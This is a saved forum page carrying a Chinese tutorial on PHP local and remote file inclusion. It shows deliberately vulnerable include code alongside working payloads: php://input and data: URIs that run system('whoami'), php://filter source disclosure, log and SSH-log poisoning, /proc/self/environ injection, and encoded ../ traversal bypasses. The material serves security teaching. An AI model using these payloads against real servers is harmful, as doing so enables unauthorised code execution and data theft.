+<li id="td_skin"><a href="javascript:;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/style.gif" alt="论坛风格切换" align="absmiddle"></a></li>
+	</ul>
+	<img id="td_cate" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/home.gif" title="快速跳转至其他版块" onclick="return pwForumList(false,false,null,this);" class="cp breadHome"><em class="breadEm"></em><a href="https://xianzhi.aliyun.com/forum/fourms.php" title="安全技术社区">安全技术社区</a><em>&gt;</em><a href="https://xianzhi.aliyun.com/forum/thread/4.html?page=2">漏洞研究</a><em>&gt;</em><a href="https://xianzhi.aliyun.com/forum/read/2204.html">php文件包含漏洞</a>
+</div>
+<!--发帖 分页-->
+<div class="cc mb10">
+	<a href="https://xianzhi.aliyun.com/forum/post.php?fid=4" class="fr y-btn y-btn-white" id="td_post" title="发帖">发表主题</a>
+
+	<a href="https://xianzhi.aliyun.com/forum/post.php?action=reply&amp;fid=4&amp;tid=2204" class="fr mr10 y-btn" rel="nofollow">回复主题</a>
+
+	<div class="fl"><span class="pages"><a href="https://xianzhi.aliyun.com/forum/thread/4.html" class="w">«&nbsp;返回列表</a></span><span class="fl"></span><span class="pages"><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=2204&amp;fpage=2&amp;goto=previous" rel="nofollow">上一主题</a><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=2204&amp;fpage=2&amp;goto=next" rel="nofollow">下一主题</a></span></div>
+</div>
+<div id="menu_post" class="pw_menu tac" style="display:none;">
+	<ul class="menuList" id="post_typeChoose">
+		<li><a href="https://xianzhi.aliyun.com/forum/post.php?fid=4" hidefocus="true" rel="nofollow">新帖</a></li>
+	</ul>
+</div>
+<!--帖子管理-->
+<!--帖子楼层开始-->
+<script type="text/javascript">
+var readFace = {
+	t1 : null,
+	t2 : null,
+	show : function(id) {this.t1 = setTimeout(function() {getObj(id).style.display = '';}, 400);},
+	clear : function() {clearTimeout(this.t1);},
+	close : function(id) {getObj(id).style.display = 'none';}
+}
+</script>
+<div id="pw_content" class="mb10">
+	<form name="delatc" method="post">
+	<input name="fid" value="4" type="hidden">
+	<input name="tid" id="tid" value="2204" type="hidden">
+	<input name="hideUid" id="hideUid" value="" type="hidden">
+	<div class="readTop">
+		<table style="table-layout:fixed;" width="100%">
+<tbody><tr>
+	<td class="floot_left">
+		<div class="readNum">
+<ul class="cc">
+	<li><em>2361</em>阅读</li>
+	<li><em>1</em>回复</li>
+</ul>
+		</div>
+	</td>
+	<td style="background:#fbfbfb"><h3 id="subject_tpc" class="read_h1"><a href="https://xianzhi.aliyun.com/forum/thread/4.html?type=6" class="s5">[Web安全]</a>php文件包含漏洞</h3></td>
+	<td class="readStairs" style="background:#fbfbfb;" width="110">
+	<input class="input mr5" name="floor" id="floor" onkeypress="if(event.keyCode == 13){getFloorUrl(this);return false;};" type="text">
+	<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/stairs.png" onclick="getFloorUrl(getObj('floor'))" class="cp" align="absmiddle"></td>
+</tr>
+		</tbody></table>
+	</div>
+	<table class="flootbg" width="100%"><tbody><tr><td>
+	</td></tr></tbody></table>
+	<a name="tpc"></a>
+	<div class="read_t" id="readfloor_tpc">
+		<table class="floot" width="100%">
+<tbody><tr class="vt">
+	<td rowspan="2" class="floot_left">
+		<div class="floot_leftdiv">
+<div class="readFace">
+	<div class="fl">
+		<div class="card" style="display:none" id="readFace_0" onmouseover="this.style.display='';" onmouseout="this.style.display='none';">
+<dl class="cc">
+	<dt class="fl">
+		<div class="cc"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1439371051719504" class="face_img"><img class="pic" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/1439371051719504.jpg" border="0"></a></div>
+		<p>UID：1439371051719504</p>
+	</dt>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>注册时间</span>2017-03-13</li>
+<li><span>最后登录</span>2017-10-25</li>
+<li><span>在线时间</span>2小时</li>
+		</ul>
+	</dd>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>发帖</span>1</li>
+<li><a href="https://xianzhi.aliyun.com/forum/apps.php?q=article&amp;uid=1439371051719504" target="_blank">搜Ta的帖子</a></li>
+<li><span>精华</span>0
+</li>
+<li class="cc"><span>积分</span>2</li><li class="cc"><span>威望</span>1</li><li class="cc"><span>贡献值</span>0</li><li class="cc"><span>人民币</span>0</li>
+		</ul>
+	</dd>
+	<dd class="ddB">
+		<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1439371051719504" class="add_home">访问TA的空间</a><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=addfriend&amp;touid=1439371051719504')" class="add_fri">加好友</a><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=usertool&amp;uid=1439371051719504')" class="add_pro">用道具</a>
+	</dd>
+</dl>
+		</div>
+	</div>
+</div>
+<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1439371051719504" id="card_sf_tpc_1439371051719504" class="userCard face_img">
+<img onmouseover="readFace.show('readFace_0');" onmouseout="readFace.clear()" class="pic" src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/1439371051719504.jpg" border="0">
+</a>
+
+
+<div class="author"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/stealth.png" title="离线" align="absmiddle"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1439371051719504">chybeta</a></div><div class="readLevel mb5">
+	<span>级别: <a rel="nofollow" href="https://xianzhi.aliyun.com/forum/profile.php?action=permission&amp;gid=8">P5_安全攻城狮</a>
+	</span>
+	<!-- 新的星级
+	<div class="star">
+		<div style="width:100%"></div>
+	</div>
+	-->
+
+	<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/1.gif">
+
+</div>
+<div class="readUser_info cc mb10">
+	<ul class="two cc">
+		<li><a href="javascript:;" onclick="Attention.add(this,'1439371051719504',0)" class="add_fol">加关注</a></li>
+		<li><a href="javascript:;" onclick="sendmsg('https://xianzhi.aliyun.com/forum/pw_ajax.php?action=msg&amp;touid=1439371051719504');" class="add_mes">写私信</a></li>
+	</ul>
+</div>
+
+<div></div>
+		</div>
+	</td>
+	<td class="floot_right" id="td_tpc"><a name="post_tpc"></a>
+<!--印戳-->
+<!--楼层信息及编辑-->
+		<div class="tipTop s6">
+<span class="fr">
+	<a href="javascript:;" onclick="window.location=('https://xianzhi.aliyun.com/forum/read/2204.html?uid=1439371051719504&amp;displayMode=1');return false;" title="只看楼主的所有帖子" class="mr5 s6">只看楼主</a>
+	<a href="javascript:;" id="td_More" onclick="read.open('menu_More','td_More');" class="link_down mr5 s6"><span>更多操作</span></a>
+	<div id="menu_More" class="popout" style="display:none;"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="bgcorner1"></td><td class="pobg1"></td><td class="bgcorner2"></td></tr><tr><td class="pobg4"></td><td><div class="popoutContent">
+		<ul class="menuList" style="width:70px;">
+<li><a href="https://xianzhi.aliyun.com/forum/read/2204.html?ordertype=desc&amp;displayMode=1" title="倒序阅读">倒序阅读</a></li>
+<li><a href="javascript:;" title="https://xianzhi.aliyun.com/forum/read/2204.html?u=" onclick="copyUrl('');">复制链接</a></li>
+
+		</ul>
+	</div></td><td class="pobg2"></td></tr><tr><td class="bgcorner4"></td><td class="pobg3"></td><td class="bgcorner3"></td></tr></tbody></table></div>
+</span>
+<a class="s2 b cp" onclick="copyFloorUrl('tpc')" title="复制此楼地址">楼主</a>&nbsp;&nbsp;<span title="2017-10-11 13:12:03">发表于: 10-11</span>
+                    </div>
+<!--帖子顶部ad-->
+<!--管理提醒-->
+<!--活动参加按钮-->
+<div id="p_tpc"></div>
+<!--帖子右侧（广告/动漫表情）-->
+		<div class="readCon_right tar">
+		</div>
+<!--content_read-->
+                <div class="tpc_content">
+                    <div class="f14 mb10" id="read_tpc">
+                        <main class="wysiwyg"><h1>基本</h1>
+<h2>相关函数</h2>
+<p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ol>
+<li><a href="http://www.php.net/manual/en/function.include.php">include()</a></li>
+<li><a href="http://php.net/manual/en/function.include-once.php">include_once()</a></li>
+<li><a href="http://php.net/manual/en/function.require.php">require()</a></li>
+<li><a href="http://php.net/manual/en/function.require-once.php">require_once()</a></li>
+</ol>
+<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/1.png" alt=""></p>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/2.png" alt=""></p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 
+类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 
+则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include $file;
+?&gt;</code></pre>
+<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：</p>
+<pre><code>index.php?file=phpinfo.txt</code></pre>
+<p>即可成功解析phpinfo。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/3.png" alt=""></p>
+<h2>场景</h2>
+<ol>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET['file'];</code>。</li>
+</ol>
+<h2>分类</h2>
+<h3>LFI(Local File Inclusion)</h3>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<h3>RFI(Remote File Inclusion)</h3>
+<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>
+但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/4.png" alt=""></p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h1>包含姿势</h1>
+<p>下面例子中测试代码均为：</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include $file;
+?&gt;</code></pre>
+<p>allow_url_fopen 默认为 On<br>
+allow_url_include 默认为 Off</p>
+<p>若有特殊要求，会在利用条件里指出。</p>
+<h2>php伪协议</h2>
+<h3>php://input</h3>
+<p>利用条件：</p>
+<ol>
+<li>allow_url_include = On。</li>
+<li>对allow_url_fopen不做要求。</li>
+</ol>
+<p>姿势：</p>
+<pre><code>index.php
+?file=php://input
+
+POST:
+&lt;? phpinfo();?&gt;</code></pre>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/5.png" alt=""></p>
+<h3>php://filter</h3>
+<p>利用条件：无甚</p>
+<p>姿势：</p>
+<pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/8.png" alt=""></p>
+<pre><code class="language-python">&gt;&gt;&gt; import base64
+&gt;&gt;&gt; base64.b64decode("PD9waHAgDQoJJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KCWluY2x1ZGUgJGZpbGU7DQo/Pg==")
+b"&lt;?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?&gt;"</code></pre>
+<p>其他姿势：</p>
+<pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre>
+<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h3>phar://</h3>
+<p>利用条件：</p>
+<ol start="0">
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：</p>
+<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/9.png" alt=""></p>
+<p>指定绝对路径</p>
+<pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></pre>
+<p>或者使用相对路径（这里test.zip就在当前目录下）</p>
+<pre><code>index.php?file=phar://test.zip/phpinfo.txt</code></pre>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/10.png" alt=""></p>
+<h3>zip://</h3>
+<p>利用条件：</p>
+<ol start="0">
+<li>php版本大于等于php5.3.0</li>
+</ol>
+<p>姿势：<br>
+构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p>
+<pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</code></pre>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/11.png" alt=""></p>
+<p>若是使用相对路径，则会包含失败。</p>
+<h3>data:URI schema</h3>
+<p>利用条件：</p>
+<ol start="0">
+<li>php版本大于等于php5.2</li>
+<li>allow_url_fopen = On</li>
+<li>allow_url_include = On</li>
+</ol>
+<p>姿势一：</p>
+<pre><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/6.png" alt=""></p>
+<p>执行命令：</p>
+<pre><code>index.php?file=data:text/plain,&lt;?php system('whoami');?&gt;</code></pre>
+<p>姿势二：</p>
+<pre><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>
+<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code><br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/7.png" alt=""></p>
+<p>执行命令：</p>
+<pre><code>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code></pre>
+<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system('whoami');?&gt;</code></p>
+<h2>包含session</h2>
+<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/14.png" alt=""></p>
+<p>在默认情况下一般是保存在<code>/tmp</code>目录中。</p>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/16.png" alt=""></p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">透過 LFI 引入 PHP session 檔案觸發 RCE</a></p>
+<h2>包含日志</h2>
+<h3>访问日志</h3>
+<p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>姿势：</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>
+<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/12.png" alt=""></p>
+<p>正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/13.png" alt=""></p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup </a></p>
+<h3>SSH log</h3>
+<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：</p>
+<p>用ssh连接：</p>
+<pre><code>ubuntu@VM-207-93-ubuntu:~$ ssh '&lt;?php phpinfo(); ?&gt;'@remotehost</code></pre>
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>然后在remotehost的ssh-log中即可写入php代码：<br>
+<img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/17.png" alt=""></p>
+<p>之后进行文件包含即可。</p>
+<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a></p>
+<h2>包含environ</h2>
+<p>利用条件：</p>
+<ol start="0">
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>姿势：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p>可以参考这个：</p>
+<ol>
+<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection </a></li>
+<li><a href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></li>
+</ol>
+<h2>包含fd</h2>
+<p>跟包含environ类似。</p>
+<p>参考： <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
+<h2>包含临时文件</h2>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/804631-20151116135028890-525890377.jpg" alt=""></p>
+<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">LFI With PHPInfo Assistance</a></p>
+<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></p>
+<h2>包含上传文件</h2>
+<p>利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
+<p>姿势：</p>
+<p>往往要配合上传的姿势，不说了，太多了。</p>
+<h2>其余</h2>
+<p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</p>
+<h1>绕过姿势</h1>
+<p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET['file'];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include '/var/www/html/'.$file.'/test/test.php';
+?&gt;</code></pre>
+<p>这样就很“难”直接去包含前面提到的种种文件。</p>
+<h2>指定前缀</h2>
+<p>先考虑一下指定了前缀的情况吧。测试代码:</p>
+<pre><code class="language-php">&lt;?php
+&nbsp;&nbsp;&nbsp;&nbsp;$file = $_GET['file'];
+&nbsp;&nbsp;&nbsp;&nbsp;include '/var/www/html/'.$file;
+?&gt;</code></pre>
+<h3>目录遍历</h3>
+<p>这个最简单了，简要的提一下。</p>
+<p>现在在/var/log/test.txt文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
+<pre><code>include.php?file=../../log/test.txt</code></pre>
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。</p>
+<p><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/18.png" alt=""></p>
+<h3>编码绕过</h3>
+<p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ../<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %2e%2e%2f<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ..%2f<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %2e%2e/&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ..\<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %2e%2e%5c<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ..%5c<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %2e%2e\</li>
+<li>二次编码<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ../<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %252e%252e%252f<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ..\<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %252e%252e%255c</li>
+<li>容器/服务器的编码方式<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ../<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ ..%c0%af<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ 注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ %c0%ae%c0%ae/<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ 注：java中会把"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII字符的"."（点）<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ Apache Tomcat Directory Traversal<br>
+&nbsp;&nbsp;&nbsp;&nbsp;+ ..\<br>
